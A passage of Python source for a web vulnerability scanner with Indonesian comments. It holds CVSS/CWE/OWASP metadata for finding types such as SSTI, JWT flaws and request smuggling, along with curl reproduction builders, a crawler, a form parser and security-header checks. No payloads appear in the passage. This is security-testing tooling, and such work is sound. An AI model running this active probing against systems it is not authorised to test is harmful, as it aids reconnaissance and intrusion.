    "XXE_FORM":             FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
    "SSTI":                 FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-1336", "A03:2021", "firm"),
    "NOSQLI":               FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-943", "A03:2021", "tentative"),
    "GRAPHQL_INTROSPECTION": FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A01:2021", "firm"),
    "JS_SECRET":            FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N", 8.6, "CWE-798", "A07:2021", "firm"),
    "JWT_ALG_NONE":         FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:N", 9.1, "CWE-347", "A07:2021", "certain"),
    "CORS_WILDCARD":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-942", "A05:2021", "firm"),
    "CORS_WILDCARD_CRED":   FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N", 8.1, "CWE-942", "A05:2021", "firm"),
    "CORS_REFLECT":         FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", 4.3, "CWE-942", "A05:2021", "tentative"),
    "TLS_EXPIRING":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-298", "A02:2021", "firm"),
    "TLS_EXP_SOON":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N", 3.7, "CWE-298", "A02:2021", "firm"),
    "TLS_CERT_ERR":         FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4, "CWE-295", "A02:2021", "firm"),
    "SERVER_LEAK":          FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
    "XPOWERED_LEAK":        FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A05:2021", "firm"),
    "COOKIE_ISSUE":         FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-614", "A05:2021", "firm"),
    "FORM_HTTP":            FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-319", "A02:2021", "firm"),
    # Kelas kerentanan tingkat lanjut (otorisasi objek, CSRF, JWT, auth bypass,
    # API spec, host header/cache, CRLF, request smuggling, OOB).
    "IDOR_READ":            FindingMeta("CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", 6.5, "CWE-639", "A01:2021", "tentative"),
    "IDOR_ANON":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-284", "A01:2021", "firm"),
    "CSRF_NO_TOKEN":        FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-352", "A01:2021", "tentative"),
    "CSRF_TOKEN_IGNORED":   FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-352", "A01:2021", "firm"),
    "JWT_WEAK_SECRET":      FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:N", 9.1, "CWE-798", "A07:2021", "firm"),
    "JWT_ALG_CONFUSION":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4, "CWE-347", "A07:2021", "firm"),
    "JWT_KID_TRAVERSAL":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N", 7.4, "CWE-22", "A07:2021", "firm"),
    "JWT_NO_EXPIRY":        FindingMeta("CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:N/A:N", 3.1, "CWE-613", "A07:2021", "tentative"),
    "JWT_EXPIRED_ACCEPTED": FindingMeta("CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N", 6.5, "CWE-613", "A07:2021", "firm"),
    "AUTH_BYPASS_HEADER":   FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-284", "A01:2021", "firm"),
    "AUTH_BYPASS_PATH":     FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-284", "A01:2021", "firm"),
    "API_SPEC_EXPOSED":     FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-200", "A01:2021", "firm"),
    "HOST_HEADER_INJECTION": FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N", 4.2, "CWE-644", "A05:2021", "firm"),
    "CACHE_POISONING":      FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:L/A:N", 5.4, "CWE-349", "A05:2021", "tentative"),
    "CACHE_DECEPTION":      FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-525", "A01:2021", "tentative"),
    "REQUEST_SMUGGLING":    FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N", 8.7, "CWE-444", "A08:2021", "firm"),
    "CRLF_INJECTION":       FindingMeta("CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N", 4.3, "CWE-93", "A03:2021", "firm"),
    "SSRF_BLIND":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-918", "A10:2021", "firm"),
    "XXE_BLIND":            FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:N/A:N", 7.5, "CWE-611", "A05:2021", "firm"),
    "CMDI_BLIND":           FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:H/I:H/A:H", 9.8, "CWE-78", "A03:2021", "firm"),
    # Temuan informasional: tidak ada skor CVSS yang berlaku, tapi CWE/OWASP tetap dipetakan.
    "TECH":                 FindingMeta(None, 0.0, "CWE-200", "A05:2021", "firm"),
    "JS_APIS":              FindingMeta(None, 0.0, "CWE-200", "A01:2021", "firm"),
    "ROBOTS":               FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
    "SUBDOMAINS":           FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
    "JWT_COOKIE":           FindingMeta(None, 0.0, "CWE-522", "A07:2021", "firm"),
    "JWT_BEARER":           FindingMeta(None, 0.0, "CWE-522", "A07:2021", "firm"),
    "RATE_LIMIT":           FindingMeta(None, 0.0, "CWE-770", "A04:2021", "firm"),
    "NO_RATE_LIMIT":        FindingMeta(None, 0.0, "CWE-770", "A04:2021", "tentative"),
    "JWT_ALG_CONFUSION_SURFACE": FindingMeta(None, 0.0, "CWE-347", "A07:2021", "tentative"),
    "JWT_KID_SUSPECT":      FindingMeta(None, 0.0, "CWE-22", "A07:2021", "tentative"),
    "PARAM_DISCOVERY":      FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
    # Recon (bagian 3): subdomain, URL historis, endpoint JS, port terbuka.
    "SUBDOMAIN_LIVE":       FindingMeta(None, 0.0, "CWE-200", "A01:2021", "firm"),
    "HISTORIC_URLS":        FindingMeta(None, 0.0, "CWE-200", "A01:2021", "tentative"),
    "JS_ENDPOINT":          FindingMeta(None, 0.0, "CWE-200", "A01:2021", "firm"),
    "PORT_OPEN":            FindingMeta(None, 0.0, "CWE-200", "A05:2021", "firm"),
    "RECON_SOURCE_SKIPPED": FindingMeta(None, 0.0, None, None, "certain"),
    "SCAN_ERROR":           FindingMeta(None, 0.0, None, None, "certain"),
}

# Keluarga kode dinamis: MISS_* (header tidak diset), HDR_* (header terpasang),
# WEAK_* (protokol/kriptografi lemah).
META_PREFIX_RULES = (
    ("MISS_", FindingMeta(f"{_CVSS_NO_SCOPE_CHANGE}/C:L/I:N/A:N", 5.3, "CWE-693", "A05:2021", "certain")),
    ("HDR_", FindingMeta(None, 0.0, "CWE-693", "A05:2021", "certain")),
    ("WEAK_", FindingMeta("CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N", 5.9, "CWE-327", "A02:2021", "certain")),
)

# Kode yang buktinya belum cukup untuk disebut pasti, apa pun kata tabel meta.
TENTATIVE_CODES = frozenset({
    "SSRF", "SSRF_FORM", "SSRF_TIMEOUT", "CORS_REFLECT", "XSS_STORED",
    "ROBOTS", "SUBDOMAINS", "NO_RATE_LIMIT", "HISTORIC_URLS",
})

CONFIDENCE_LEVELS = ("certain", "firm", "tentative")

def finding_meta(code):
    """Metadata CVSS/CWE/OWASP/confidence untuk satu kode temuan.

    Kode yang belum dipetakan mengembalikan None — vector CVSS tidak pernah
    dikarang untuk kode yang tidak dikenal.
    """
    if not code:
        return None
    meta = FINDING_META.get(code)
    if meta is not None:
        return meta
    for prefix, prefix_meta in META_PREFIX_RULES:
        if code.startswith(prefix):
            return prefix_meta
    return None

def cvss_of(meta):
    """Payload CVSS `{"vector": ..., "score": ...}` untuk sebuah FindingMeta.

    Kembalikan None kalau meta tidak ada atau vector-nya kosong (temuan
    informasional), supaya laporan tidak salah menampilkan "skor 0.0".
    """
    if meta is None or not meta.vector:
        return None
    return {"vector": meta.vector, "score": meta.score}

def finding_confidence(code, declared=None):
    """Tingkat keyakinan temuan: certain/firm/tentative."""
    if declared:
        base = declared
    else:
        meta = finding_meta(code)
        base = meta.confidence if meta else "firm"
    if code in TENTATIVE_CODES and base != "tentative":
        return "tentative"
    return base

def make_finding_id(code, url, desc):
    """ID temuan yang stabil antar scan: sha256(code|url|desc) 12 karakter pertama."""
    raw = "|".join([code or "", url or "", desc or ""])
    return "spade-" + hashlib.sha256(raw.encode("utf-8")).hexdigest()[:12]

def _shell_quote(value):
    return "'" + str(value).replace("'", "'\\''") + "'"

REPRO_SKIP_HEADERS = frozenset({"content-length", "host", "accept-encoding"})

def repro_curl(exchange, impersonate=DEFAULT_IMPERSONATE, redact=None):
    """Bangun langkah reproduksi dari satu Exchange.

    Mengembalikan dict `{"curl": ..., "python_curl_cffi": ...}`. Perintah `curl`
    portabel dipakai sebagai PoC utama; snippet `curl_cffi` disertakan supaya
    fingerprint browser (impersonate) scan bisa direplikasi. Nilai cookie selalu
    diganti placeholder — cookie hasil scan tidak valid untuk pembaca laporan.
    """
    if exchange is None:
        return {"curl": "", "python_curl_cffi": ""}
    if redact is None:
        redact = REDACT_ENABLED
    url = redact_url(exchange.url, redact)
    headers = dict(exchange.request_headers or {})
    header_args = []
    py_headers = {}
    content_type = ""
    for name, value in headers.items():
        lowered = name.lower()
        if lowered == "cookie":
            py_headers[name] = "COOKIE_ANDA"
            header_args.append(f"-H {_shell_quote(f'{name}: COOKIE_ANDA')}")
            continue
        if lowered in REPRO_SKIP_HEADERS:
            continue
        if lowered == "content-type":
            content_type = str(value)
        py_headers[name] = value
        header_args.append(f"-H {_shell_quote(f'{name}: {value}')}")
    body = exchange.request_body or ""
    segments = ["curl -sS -i", f"-X {exchange.method}"] + header_args
    if body:
        segments.append(f"--data-raw {_shell_quote(body)}")
    segments.append(_shell_quote(url))
    curl_command = " ".join(segments)
    py_kwargs = [f"impersonate={impersonate!r}", "timeout=15"]
    if py_headers:
        py_kwargs.append(f"headers={py_headers!r}")
    if body:
        payload = body
        if "json" in content_type.lower():
            try:
                payload = json.loads(body)
                py_kwargs.append(f"json={payload!r}")
            except ValueError:
                py_kwargs.append(f"data={payload!r}")
        else:
            py_kwargs.append(f"data={payload!r}")
    py_snippet = "\n".join([
        "from curl_cffi import requests",
        f"r = requests.{exchange.method.lower()}({url!r}, {', '.join(py_kwargs)})",
        "print(r.status_code, len(r.content))",
    ])
    return {"curl": curl_command, "python_curl_cffi": py_snippet}

class Finding:
    """Temuan dengan bukti + metadata, tetap kompatibel dengan tuple lama.

    Iterasi, `len()`, indexing, dan perbandingan tetap memakai bentuk lama
    `(sev, code, desc, url)` supaya modul dan report yang sudah ada tidak perlu
    diubah. Attribute tambahan: `evidence`, `confidence`, `meta`, `finding_id`.
    """

    __slots__ = ("sev", "code", "desc", "url", "evidence", "confidence", "meta", "finding_id")

    def __init__(self, sev, code, desc, url=None, evidence=None, confidence=None, meta=None, finding_id=None):
        self.sev = sev
        self.code = code
        self.desc = desc
        self.url = url
        self.evidence = evidence
        self.meta = finding_meta(code) if meta is None else meta
        self.confidence = finding_confidence(code, confidence)
        self.finding_id = finding_id or make_finding_id(code, url, desc)

    def _key(self):
        return (self.sev, self.code, self.desc, self.url)

    def __getitem__(self, index):
        return self._key()[index]

    def __len__(self):
        return 4

    def __iter__(self):
        return iter(self._key())

    def __eq__(self, other):
        if isinstance(other, Finding):
            return self._key() == other._key()
        if isinstance(other, tuple):
            return self._key()[:len(other)] == tuple(other)
        return NotImplemented

    def __hash__(self):
        return hash(self._key())

    def __repr__(self):
        return f"Finding({self.sev!r}, {self.code!r}, url={self.url!r})"

    def to_dict(self, snippet_chars=EVIDENCE_SNIPPET_CHARS_JSON, redact=None, impersonate=None):
        """Serialisasi satu temuan untuk laporan JSON."""
        if redact is None:
            redact = REDACT_ENABLED
        meta = self.meta
        return {
            "id": self.finding_id,
            "severity": self.sev,
            "code": self.code,
            "description": self.desc,
            "url": redact_url(self.url, redact) if self.url else self.url,
            "confidence": self.confidence,
            "cvss": cvss_of(meta),
            "cwe": meta.cwe if meta else None,
            "owasp": meta.owasp if meta else None,
            "evidence": self.evidence.to_dict(snippet_chars, redact) if self.evidence else None,
            "repro": repro_curl(self.evidence, impersonate or DEFAULT_IMPERSONATE, redact),
        }

def as_finding(item):
    """Normalisasi tuple lama atau Finding menjadi Finding."""
    if isinstance(item, Finding):
        return item
    values = list(item) if isinstance(item, (tuple, list)) else [item]
    values = (values + [None, None, None, None])[:4]
    return Finding(values[0], values[1], values[2], values[3])

class FindingList(list):
    """List temuan yang otomatis mengubah tuple lama menjadi Finding + menempelkan bukti.

    `default_evidence_url` dipakai kalau temuan tidak punya URL sendiri (modul
    pasif seperti security headers). `capture=False` untuk modul yang memang
    tidak menembak HTTP (mis. pemeriksaan TLS via socket).
    """

    def __init__(self, default_evidence_url=None, capture=True, iterable=()):
        super().__init__()
        self.default_evidence_url = default_evidence_url
        self.capture = capture
        if iterable:
            self.extend(iterable)

    def append(self, item, evidence_url=_DEFAULT, evidence=None, confidence=None):
        # `evidence_url=None` eksplisit berarti "temuan ini tidak punya request
        # pemicu" (mis. SCAN_ERROR), jadi jangan tempelkan bukti apa pun.
        explicit_no_evidence = evidence_url is None
        lookup = self.default_evidence_url if evidence_url is _DEFAULT else evidence_url
        if isinstance(item, Finding):
            finding = item
        else:
            finding = as_finding(item)
        if confidence is not None:
            finding.confidence = finding_confidence(finding.code, confidence)
        if evidence is None and finding.evidence is None and self.capture and not explicit_no_evidence:
            lookup = lookup if lookup is not None else finding.url
            if lookup:
                evidence = evidence_for(lookup)
        if evidence is not None and finding.evidence is None:
            finding.evidence = evidence
        super().append(finding)

    def extend(self, items):
        if isinstance(items, (Finding, tuple)):
            self.append(items)
            return
        for item in items:
            self.append(item)

class ThreadLocalSession:
    """Proxy Session yang membuat curl_cffi Session terpisah per thread.

    Dipakai supaya request bisa diparalelkan tanpa berbagi satu Session antar
    thread. Seluruh request melewati satu funnel (`.request()`), jadi timeout
    default dan retry status HTTP berlaku seragam untuk semua modul tanpa perlu
    mengubah call site. Atribut lain (cookies, headers, close) didelegasikan ke
    Session milik thread terkait lewat __getattr__.
    """

    def __init__(self, timeout=15, verify_ssl=True, impersonate=_DEFAULT, retries=None,
                 extra_headers=None):
        self._local = threading.local()
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.impersonate = impersonate
        self.retries = STATUS_RETRIES if retries is None else max(0, retries)
        # Header auth (Cookie/Authorization/-H) dipakai tiap request. Salinan
        # dibuat di sini supaya pemanggil tidak bisa mengubahnya di tengah scan.
        self.extra_headers = dict(extra_headers or {})

    def _session(self):
        sess = getattr(self._local, "sess", None)
        if sess is None:
            sess = make_session(timeout=self.timeout, verify_ssl=self.verify_ssl,
                                impersonate=self.impersonate,
                                extra_headers=self.extra_headers)
            self._local.sess = sess
        return sess

    def request(self, method, url, **kwargs):
        """Kirim request dengan timeout default + retry status HTTP transparan.

        curl_cffi hanya me-retry error transport; retry untuk status 429/5xx
        (perilaku lama dari urllib3.Retry) dibuat ulang di sini, termasuk
        menghormati header Retry-After, supaya cakupan modul tidak berkurang.
        """
        kwargs.setdefault("timeout", self.timeout)
        method = method.upper()
        max_attempts = self.retries if method in RETRY_METHODS else 0
        started = time.monotonic()
        resp = None
        for attempt in range(max_attempts + 1):
            resp = self._session().request(method, url, **kwargs)
            if resp.status_code not in RETRY_STATUS or attempt >= max_attempts:
                break
            time.sleep(_retry_after_seconds(resp.headers.get("Retry-After")))
        # Bukti direkam di satu-satunya funnel request, termasuk respons 4xx/5xx,
        # supaya setiap temuan punya request/response pendukungnya.
        record_exchange(exchange_from_response(resp, method, (time.monotonic() - started) * 1000,
                                               kwargs, session_cookies=self._cookie_items()))
        return resp

    def _cookie_items(self):
        """Isi cookie jar session thread ini, atau None kalau tidak tersedia.

        Dipakai hanya untuk menambah header Cookie ke bukti; kegagalan di sini
        tidak boleh menggagalkan request yang sudah berhasil.
        """
        try:
            return list(self._session().cookies.items())
        except Exception:
            return None

    def get(self, url, **kwargs):     return self.request("GET", url, **kwargs)
    def post(self, url, **kwargs):    return self.request("POST", url, **kwargs)
    def put(self, url, **kwargs):     return self.request("PUT", url, **kwargs)
    def patch(self, url, **kwargs):   return self.request("PATCH", url, **kwargs)
    def delete(self, url, **kwargs):  return self.request("DELETE", url, **kwargs)
    def head(self, url, **kwargs):    return self.request("HEAD", url, **kwargs)
    def options(self, url, **kwargs): return self.request("OPTIONS", url, **kwargs)

    def __getattr__(self, name):
        return getattr(self._session(), name)


REQUEST_EXECUTOR = None
DEFAULT_WORKERS = 10


def set_request_executor(workers):
    """Batasi total request paralel untuk seluruh modul."""
    global REQUEST_EXECUTOR
    if REQUEST_EXECUTOR is not None:
        REQUEST_EXECUTOR.shutdown(wait=False)
        REQUEST_EXECUTOR = None
    if workers and workers > 1:
        REQUEST_EXECUTOR = ThreadPoolExecutor(max_workers=workers, thread_name_prefix="spade-req")


def pmap(fn, items, workers=None):
    """Map paralel dengan worker global yang sama untuk semua modul."""
    items = list(items)
    if not items:
        return []
    if REQUEST_EXECUTOR is None or (workers is not None and workers <= 1):
        return [fn(x) for x in items]
    return list(REQUEST_EXECUTOR.map(fn, items))

def pmap_until(fn, items):
    """Map paralel, berhenti lebih awal begitu ada hasil yang truthy.

    Dipakai modul deteksi (SQLi/XSS/CMDi/...) supaya job sisa tidak ikut
    dieksekusi setelah satu temuan ditemukan. Ini penghemat besar di mode
    DETAILED karena jumlah payload × parameter bisa ratusan request.
    """
    items = list(items)
    if not items:
        return None
    if REQUEST_EXECUTOR is None:
        for x in items:
            out = fn(x)
            if out:
                return out
        return None
    stop = threading.Event()

    def _wrapped(x):
        if stop.is_set():
            return None
        out = fn(x)
        if out:
            stop.set()
        return out

    futures = [REQUEST_EXECUTOR.submit(_wrapped, x) for x in items]
    try:
        for fut in as_completed(futures):
            out = fut.result()
            if out:
                stop.set()
                for other in futures:
                    other.cancel()
                return out
    except Exception:
        pass
    finally:
        stop.set()
    return None

# ── HTML form parser ──
class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self._cur = None; self._ta = False
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == "form":
            self._cur = {"action": a.get("action",""), "method": a.get("method","get").upper(), "inputs": []}
        elif tag in ("input","textarea") and self._cur:
            if tag == "textarea": self._ta = True
            self._cur["inputs"].append({"name": a.get("name",""), "type": a.get("type","text"), "value": a.get("value","")})
        elif tag == "select" and self._cur:
            self._cur["inputs"].append({"name": a.get("name",""), "type": "select", "value": ""})
    def handle_endtag(self, tag):
        if tag == "form" and self._cur: self.forms.append(self._cur); self._cur = None
        elif tag == "textarea": self._ta = False
    def handle_data(self, data):
        if self._ta and self._cur and self._cur["inputs"]:
            inp = self._cur["inputs"][-1]
            if not inp["value"]: inp["value"] = data.strip()

# ── crawler ──
class Crawler:
    def __init__(self, sess, base_url, depth=1, max_p=30, extra_seeds=()):
        self.sess = sess; self.base = base_url.rstrip("/")
        self.netloc = urllib.parse.urlparse(base_url).netloc
        self.depth = depth; self.max_p = max_p
        # Seed tambahan (mis. URL historis hasil recon) di-crawl seperti temuan link.
        self.extra_seeds = [s for s in (extra_seeds or ()) if s]
        self.visited = set(); self.pages = {}
    def _norm(self, url):
        p = urllib.parse.urlparse(url)
        return f"{p.scheme}://{p.netloc}{p.path.rstrip('/') or '/'}"
    def _internal(self, url): return urllib.parse.urlparse(url).netloc == self.netloc
    def crawl(self, seed_text=None):
        """BFS per level, fetch semua halaman di level yang sama secara paralel.

        seed_text dipakai kalau halaman root sudah di-fetch modul lain, supaya
        tidak request base URL dua kali.
        """
        level = [self.base]
        self.visited.add(self._norm(self.base))
        if seed_text is not None:
            self.pages[self.base] = seed_text
            level = []
            for m in re.finditer(r'href=["\'](.*?)["\']', seed_text, re.I):
                full = urllib.parse.urljoin(self.base, m.group(1)).split("#")[0]
                n = self._norm(full)
                if self._internal(full) and n not in self.visited:
                    if not any(n.lower().endswith(e) for e in (".pdf",".zip",".png",".jpg",".gif",".css",".js",".svg",".ico")):
                        self.visited.add(n); level.append(n)

        for seed in self.extra_seeds:
            full = urllib.parse.urljoin(self.base, seed).split("#")[0]
            n = self._norm(full)
            if self._internal(full) and n not in self.visited:
                self.visited.add(n); level.append(full)

        start_depth = 1 if seed_text is not None else 0
        for d in range(start_depth, self.depth + 1):
            if not level:
                break
            # Batasi jumlah halaman sesuai max_p
            remaining = self.max_p - len(self.pages)
            if remaining <= 0:
                break
            batch = level[:remaining]

            def _fetch(u):
                try:
                    r = self.sess.get(u, timeout=10)
                    if r.status_code == 200:
                        return u, r.text
                except: pass
                return u, None

            next_level = []
            for u, text in pmap(_fetch, batch):
                if text is None:
                    continue
                self.pages[u] = text
                if d < self.depth:
                    for m in re.finditer(r'href=["\'](.*?)["\']', text, re.I):
                        full = urllib.parse.urljoin(u, m.group(1)).split("#")[0]
                        n = self._norm(full)
                        if self._internal(full) and n not in self.visited:
                            if not any(n.lower().endswith(e) for e in (".pdf",".zip",".png",".jpg",".gif",".css",".js",".svg",".ico")):
                                self.visited.add(n); next_level.append(n)
            level = next_level
        return self.pages
    def get_forms(self):
        forms = []
        for url, html in self.pages.items():
            p = FormParser(); p.feed(html)
            for f in p.forms:
                a = urllib.parse.urljoin(url, f["action"]) if f["action"] else url
                forms.append((a, f["method"], f["inputs"], url))
        return forms

def get_forms(ctx):
    """Parse form satu kali saja, lalu pakai ulang di semua modul."""
    crawler = ctx.get("crawler") if ctx else None
    if not crawler or not crawler.pages:
        return []
    return ctx_get(ctx, ("forms", id(crawler)), crawler.get_forms)

def is_echo_endpoint(sess, url, timeout=8):
    """Probe endpoint — kalau ngulangin input mentah, skip buat ngurangin false positive."""
    probe = "__xechoprobe__" + str(int(time.time()))
    try:
        r = sess.get(url, params={"q": probe}, timeout=timeout)
        return probe in r.text
    except: return False

def echo_skip(sess, url, ctx=None):
    """Cache hasil is_echo_endpoint supaya tidak diprobe berulang di tiap modul."""
    return ctx_get(ctx, ("echo", url), lambda: is_echo_endpoint(sess, url))

# ══════════════════════════════════════════════════════════════════
# SCAN FUNCTIONS — setiap finding pakai deskripsi jelas
# ══════════════════════════════════════════════════════════════════


def get_baseline_fingerprint(sess, base_url):
    """Probe 2 random non-existent paths untuk deteksi SPA catch-all / default page.
    Mengembalikan dict fingerprint atau None jika server handle 404 dengan benar."""
    import random
    import string
    timeout = 8  # max detik per probe
    info("Membangun baseline untuk deteksi false positive...")
    probes = []
    seen = set()
    for i in range(2):
        # Hindari path duplikat
        while True:
            rand = ''.join(random.choices(string.ascii_lowercase, k=10))
            if rand not in seen:
                seen.add(rand)
                break
        path = '/_spade_probe_' + rand + '.html'
        try:
            r = sess.get(join(base_url, path), timeout=timeout)
            probes.append({
                'status': r.status_code,
                'size': len(r.content),
                'content': r.content,
                'content_type': r.headers.get('Content-Type', ''),
                'is_html': bool(b'<!DOCTYPE html' in r.content[:200] or b'<html' in r.content[:200]),
            })
        except:
            pass

    if len(probes) < 2:
        info(f'  Baseline: hanya {len(probes)} probe berhasil (mungkin koneksi terblokir)')
        return None

    # Cek konsistensi: kalo semua probe return 200 dengan content yang sama -> SPA catch-all
    all_200 = all(p['status'] == 200 for p in probes)
    same_size = probes[0]['size'] == probes[1]['size']
    same_content = probes[0]['content'] == probes[1]['content']

    if all_200 and same_size and (same_content or probes[0]['is_html']):
        info(f'  SPA catch-all terdeteksi (baseline: {probes[0]["size"]}B, {probes[0]["content_type"]})')
        return {
            'detected': 'spa_catchall',
            'content': probes[0]['content'],
            'size': probes[0]['size'],
            'content_hash': hash(probes[0]['content']),
            'content_type': probes[0]['content_type'],
            'is_html': probes[0]['is_html'],
        }

    # Kalo server return 404/403 untuk path random -> handle normal
    if all(p['status'] in (403, 404) for p in probes):
        info('  Server handle non-existent paths dengan benar (404/403)')
        return {'detected': 'proper_404'}

    info(f'  Status probes: {[p["status"] for p in probes]}, sizes: {[p["size"] for p in probes]}')
    return None



def sec_headers(sess, base_url, ctx=None):
    """Cek HTTP security headers + info server + cookie."""
    f = FindingList(base_url)
    r = get_base_response(sess, base_url, ctx)
    try:
        h = r.headers

        # Security headers checklist
        checks = [
            ("Strict-Transport-Security", "MEDIUM", "HSTS (HTTP Strict Transport Security) tidak diset. Koneksi HTTP tidak otomatis ditingkatkan ke HTTPS — risiko downgrade attack."),
            ("Content-Security-Policy", "MEDIUM", "CSP (Content Security Policy) tidak diset. Browser tidak dilindungi dari XSS via inline script atau sumber konten tidak terpercaya."),
            ("X-Content-Type-Options", "LOW", "X-Content-Type-Options: nosniff tidak diset. Browser bisa MIME-type sniffing — risiko eksekusi file non-script sebagai script."),
            ("X-Frame-Options", "MEDIUM", "X-Frame-Options tidak diset. Website bisa di-embed di iframe — risiko clickjacking."),
            ("Referrer-Policy", "LOW", "Referrer-Policy tidak diset. URL lengkap (termasuk parameter sensitif) bisa bocor ke pihak ketiga via header Referer."),
            ("Permissions-Policy", "LOW", "Permissions-Policy tidak diset. Fitur browser (kamera, mikrofon, lokasi) bisa diakses tanpa batasan oleh script pihak ketiga."),
        ]
        for hdr, sev, desc in checks:
            val = h.get(hdr)
            if val:
                good(f"{hdr}: {val[:70]}")
                f.append(("INFO", f"HDR_{hdr.upper().replace('-','_')}", f"{hdr}: {val[:70]}"))
            else:
                warn(f"{hdr} tidak diset")
                f.append((sev, f"MISS_{hdr.upper().replace('-','_')}", desc))

        # Server banner leak
        srv = h.get("Server")
        if srv:
            warn(f"Server: {srv}")
            f.append(("LOW","SERVER_LEAK",f"Header Server membocorkan versi: {srv}. Attacker bisa cari CVE spesifik untuk versi tersebut."))

        # X-Powered-By leak
        xp = h.get("X-Powered-By")
        if xp:
            warn(f"X-Powered-By: {xp}")
            f.append(("LOW","XPOWERED_LEAK",f"Header X-Powered-By membocorkan teknologi backend: {xp}."))

        # CORS
        cors = h.get("Access-Control-Allow-Origin")
        if cors == "*":
            warn("CORS: akses dari origin mana pun diizinkan")
            f.append(("MEDIUM","CORS_WILDCARD","Access-Control-Allow-Origin: * — semua domain bisa membaca respons via JavaScript. Risiko data leakage jika halaman mengandung konten privat."))

        # Cookie security check
        ck = h.get("Set-Cookie","")
        if ck:
            issues = []
            if "Secure" not in ck: issues.append("Secure")
            if "HttpOnly" not in ck: issues.append("HttpOnly")
            if "SameSite" not in ck: issues.append("SameSite")
            if issues:
                warn(f"Cookie: tidak ada flag {', '.join(issues)}")
                desc = "Cookie tidak memiliki flag "
                if "Secure" in issues: desc += "Secure (bisa dikirim lewat HTTP), "
                if "HttpOnly" in issues: desc += "HttpOnly (bisa diakses JavaScript/XSS), "
                if "SameSite" in issues: desc += "SameSite (rentan CSRF), "
                f.append(("LOW","COOKIE_ISSUE",desc.rstrip(", ")+"."))
    except: pass
    return f

def tech_finger(sess, base_url, ctx=None):
    """Deteksi teknologi dari header dan HTML."""
    f = FindingList(base_url); info("Mendeteksi teknologi website...")
    r = get_base_response(sess, base_url, ctx)
    try:
        techs = []
        srv = r.headers.get("Server")
        if srv: techs.append(srv)
        xp = r.headers.get("X-Powered-By")
        if xp: techs.append(xp)
        b = r.text
        if re.search(r'wp-content|wp-includes|wordpress',b,re.I): techs.append("WordPress")
        if 'laravel' in b.lower() or 'livewire' in b.lower(): techs.append("Laravel")
        if 'jquery' in b.lower(): techs.append("jQuery")
        if 'react' in b.lower() or 'react-dom' in b.lower(): techs.append("React")
        if 'vue' in b.lower(): techs.append("Vue.js")
        if techs:
            info(f"Terdeteksi: {', '.join(techs)}")
            f.append(("INFO","TECH","Teknologi terdeteksi: "+', '.join(techs)))
        else:
            info("Tidak ada teknologi yang teridentifikasi secara jelas")
    except: pass
    return f

def robots_txt(sess, base_url, ctx=None):
    """Analisis robots.txt."""
